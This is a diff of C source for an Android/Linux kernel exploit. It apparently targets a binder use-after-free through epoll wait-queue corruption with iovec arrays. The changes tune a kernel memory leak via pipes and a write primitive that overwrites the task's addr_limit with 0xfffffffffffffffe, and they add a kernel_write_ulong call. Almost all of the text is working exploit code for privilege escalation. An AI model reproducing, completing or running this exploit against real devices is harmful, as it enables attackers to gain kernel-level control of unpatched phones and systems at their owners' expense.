@@ -46,6 +46,7 @@
 #define PAGE 0x1000
 
 unsigned long kernel_read_ulong(unsigned long kaddr);
+void kernel_write_ulong(unsigned long kaddr, unsigned long data);
 
 void hexdump_memory(void *_buf, size_t byte_count) {
    unsigned char* buf = _buf;
@@ -99,7 +100,7 @@ void leak_data(void* leakBuffer, int leakAmount)
   iovec_array[IOVEC_INDX_FOR_WQ].iov_len = 0; /* spinlock: will turn to UAF_SPINLOCK */
   iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base = dataBuffer; /* wq->task_list->next */
   iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len = leakAmount; /* wq->task_list->prev */
-  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = (void*)0xDEADBEEF; // we shouldn't get to here
+  iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base = dataBuffer; // we shouldn't get to here
   iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = UAF_SPINLOCK; 
   
   int b;
@@ -124,25 +125,28 @@ void leak_data(void* leakBuffer, int leakAmount)
     if (read(pipefd[0], dataBuffer, PAGE) != PAGE) err(1, "read first page from pipe");
     printf("CHILD: dummy data\n");
     if (read(pipefd[0], dataBuffer, UAF_SPINLOCK) != UAF_SPINLOCK) err(1, "read dummy data from pipe");
-    printf("CHILD: leak data\n");
-    if (read(pipefd[0], dataBuffer, leakAmount) != leakAmount) err(1, "leaking");
+//    printf("CHILD: leak data\n");
+  //  if (read(pipefd[0], dataBuffer, leakAmount) != leakAmount) err(1, "leaking");
     close(pipefd[1]);
-    write(leakPipe[1], dataBuffer, leakAmount);
+    //write(leakPipe[1], dataBuffer, leakAmount);
     printf("CHILD: Finished write to FIFO.\n");
     exit(0);
   }
   printf("PARENT: Calling WRITEV\n");
   ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
   b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
-  printf("writev() returns 0x%x\n", (unsigned int)b);
   if (b != PAGE + leakAmount + UAF_SPINLOCK) 
-        err(1, "writev() returned wrong value");
+  err(1, "writev() returned wrong value");
+  if (read(pipefd[0], leakBuffer, leakAmount) != leakAmount) err(1, "leaking");
+  printf("writev() returns 0x%x\n", (unsigned int)b);
+  //hexdump_memory(dataBuffer,512);
   // leaked data
 //  printf("PARENT: Reading leaked data\n");
-  if (read(leakPipe[0], leakBuffer, leakAmount) != leakAmount) err(1, "reading leak");
+//  if (read(leakPipe[0], leakBuffer, leakAmount) != leakAmount) err(1, "reading leak");
 
   int status;
-  if (wait(&status) != fork_ret) err(1, "wait");
+  wait(&status);
+  //if (wait(&status) != fork_ret) err(1, "wait");
 
   free(dataBuffer);
 
@@ -169,12 +173,26 @@ void clobber_addr_limit(void)
   
   unsigned long second_write_chunk[] = {
     (unsigned long)dataBuffer, /* iov_base (currently in use) */   // wq->task_list->next
-    0x00, /* iov_len (currently in use) */  // wq->task_list->prev
-    &testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
-    0, /* next iov_len (sizeof(addr_limit)) */
+    0x80, /* iov_len (currently in use) */  // wq->task_list->prev
+    
+    &testDatum, //current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    8, /* next iov_len (sizeof(addr_limit)) */
+    
+    &testDatum, //current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    8, /* next iov_len (sizeof(addr_limit)) */
+    
+    0, 0,
+    0, 0,
+    0, 0,
+    0, 0,
+    0, 0,
+        
   };
+//  printf("%lx\n", (unsigned long)sizeof(second_write_chunk));
+//  for (int i=0;i<0x100/8;i++) second_write_chunk[i] = 0x7777777777777777;
   
   unsigned long third_write_chunk[] = {
+    0xfffffffffffffffe, /* value to write over addr_limit */
     0xfffffffffffffffe /* value to write over addr_limit */
   };
 
@@ -183,10 +201,13 @@ void clobber_addr_limit(void)
   iovec_array[IOVEC_INDX_FOR_WQ+1].iov_base = dataBuffer; // wq->task_list->next: will turn to address of task_list
   iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to address of task_list
   iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = &testDatum; // dataBuffer;
-  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = sizeof(third_write_chunk); 
-  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = dataBuffer;
-  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = UAF_SPINLOCK;
-  int totalLength = iovec_array[IOVEC_INDX_FOR_WQ].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len+iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len;
+  iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = 8; 
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = &testDatum; // dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = 8; 
+  iovec_array[IOVEC_INDX_FOR_WQ+4].iov_base = dataBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ+4].iov_len = UAF_SPINLOCK;
+  int totalLength = 0;
+  for (int i=0;i<IOVEC_ARRAY_SZ;i++) totalLength += iovec_array[i].iov_len;
  
   int socks[2];
   //if (socketpair(AF_UNIX, SOCK_STREAM, 0, socks)) err(1, "socketpair");
@@ -204,6 +225,7 @@ void clobber_addr_limit(void)
     
     write(socks[1], uafFill, UAF_SPINLOCK);
     write(socks[1], second_write_chunk, sizeof(second_write_chunk));
+  //  sleep(1);
     write(socks[1], third_write_chunk, sizeof(third_write_chunk));
     close(socks[1]);
     exit(0);
@@ -244,15 +266,15 @@ void clobber_addr_limit(void)
     timeout.tv_nsec = 0;
     int recvmsg_result = recvmmsg(socks[0], &mmsg, 1, MSG_WAITALL, &timeout);  */
 
-    printf("PARENT: testDatum = %lx\n", testDatum);
     hexdump_memory(dataBuffer, 16);
     hexdump_memory(dataBuffer+UAF_SPINLOCK-16, 16);
   
   printf("recvmsg() returns %d, expected %d\n", recvmsg_result,
       totalLength);
-  sleep(2);
-  unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
-  printf("current->mm == 0x%lx\n", current_mm);
+    printf("PARENT: testDatum = %lx\n", testDatum);
+  //sleep(2);
+  kernel_write_ulong(current_ptr+8,0xfffffffffffffffe);
+  //printf("current->mm == 0x%lx\n", current_mm);
 }
 
 int kernel_rw_pipe[2];
@@ -302,7 +324,7 @@ int main(int argc, char** argv) {
 
   binder_fd = open("/dev/binder", O_RDONLY);
   epfd = epoll_create(1000);
-  int leakSize = argc < 2 ? 4096 : atoi(argv[1]);
+  int leakSize = argc < 2 ? 1024 : atoi(argv[1]);
   printf("Leak size %d\n", leakSize);
   unsigned char* leaked = malloc(leakSize);
   if (leaked == NULL) err(1, "Allocating leak buffer");
@@ -316,6 +338,8 @@ int main(int argc, char** argv) {
       printf("current_ptr = %lx\n", (unsigned long)current_ptr);
 //      printf("Clobbering addr_limit\n");
       clobber_addr_limit();
+//      leak_data(leaked, leakSize);
+//      hexdump_memory(leaked, leakSize);
   }
   free(leaked);
   
